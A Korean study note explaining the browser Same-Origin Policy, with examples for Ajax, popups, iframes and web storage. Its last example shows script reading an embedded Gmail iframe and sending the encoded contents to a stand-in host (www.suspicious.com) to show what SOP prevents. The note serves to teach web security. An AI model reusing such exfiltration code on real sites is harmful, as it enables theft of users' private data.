# SOP(동일 출처 정책)

Origin A로 부터 로드된 Document A 또는 Script A가 

다른 Origin B로 부터 로드된 리소스와 상호작용할 수 있는 방법을 제한하는 보안 메커니즘입니다.



<hr>

- 현 Document가 어느 Origin으로 부터 로드된 것인지 알아보는 방법

  ```js
  document.location.origin //"https://www.naver.com"
  ```



# Same Origin 

> **동일한 Origin을 갖는지 판단하는 방법**
>
> (스킴 + 호스트 + 포트) 이 세 개의 조합이 같은 경우만 same origin임

> (예)
>
> https://www.naver.com/path/page.html
>
> https://www.naver.com:443/path2/page.html
>
> 위 두 리소스는 origin이 동일함(https의 기본 포트는 443)

 

# SOP가 적용되는 사례

## 1. Ajax

```js
//  https://www.siteA.com가 Origin인 공격자 Document의 script

var oReq = new XMLHttpRequest();
oReq.open("GET", "https://api.dokydoky.com/profile");
...
```

위 API호출로 JSON 응답데이터 {"id": "dokydoky", "nickname": "enjoying"}을 응답받을 수 없다. (READ불가능함)

(이유) 

 **Document의 Origin**과 **JSON의 Origin** 서로 다름.

(정리)

- 일반적인 경우 

  - 다른 Origin으로 요청을 보낸는 것 허용.
  - 응답이 필요없는 UPDATE, DELETE종류는 요청만으로도 가능(WRITE가능)
  - 단, CSRF공격에 대한 대비를 해야한다.
  - 다른 Origin으로 부터의 응답은 못받음.

  

- Preflight 요청일 경우

  - 다른 Origin으로 요청 불가능

## 2. 팝업

```js
//https://popup.siteA.com이 Origin인 Document A
window.open('https://popup.siteB.com')
```

새로운 팝업창(즉, 새로운 window)에 Document B가 로드된다.(SiteB로 부터)

SiteA로 부터 로드된 Document A는 Document B에 접근할 수 없다.



## 3. iframe

- \<script src=""> \<link rel="stylesheet" href="" > \<img> 등등
- 로딩은 가능함
- 단, 내부 리소스 접근 불가

```html
<!-- https://siteA.com이 Origin인 Document A -->
<iframe src="https://siteB.com">
```

Document A에 embeding된 iframe에 Document B가 로드되긴함.

하지만 Same Origin이 아니므로 A에서 B로 접근 불가능함.(즉, A에서 B의 리소스를 사용할 수 없음)



## 4. 웹데이터베이스

로컬스토리지, 세션스토리지는 Origin마다 하나씩 생성됨.

Same Origin인 Document나 Script에서 접근가능하다.



# 예제 코드 

## 1. iframe

```html
<!--www.siteA.co.kr -->
<iframe id="mail" src="https://mail.google.com/mail/inbox">   
</iframe>

<script>
	document.getElementById("mail").addEventListener("load", function(e){
        mailDate = document.getElementById("mail").contentDocument.body
        encoded = btoa(encodeURIComponent(mailData))
        fetch("https://www.suspicious.com?" + encoded)
    })
</script>
```

1. **SOP가 적용되지 않았을 때**

   - SiteA에서 `<iframe id="mail" src="https://mail.google.com/mail/inbox"> 코드를 통해 

     gmail로 리소스요청을 보낸다. 이때 gmail계정 세션쿠키가 Same site = none;인 상태로 쿠키값이 브라우저에 있다면 세션쿠키값이 SiteA에서 gmail로 호출시 요청헤더에 담겨 전송된다.

   - iframe에 메일정보가 로드됨.
   - 메일정보를 Top-level document에서 다른 해킹서버로 탈취함.


   ​    

2. **SOP 적용**

   - iframe에 메일데이터가 로드되는 것까지 위와 동일함
   - 하지만, iframe내부의 document를 참조하려는 시도를 할 때(.contentDocument) Null값을 리턴함.

   

   ### Cross-Origin간 정말로 데이터 교환이 필요할 때는?

   - window.postMeassage
   - 허용할 Origin (SiteA)를 응답헤더 "Access-Control-Allow-Origin"의 값으로 추가한다.











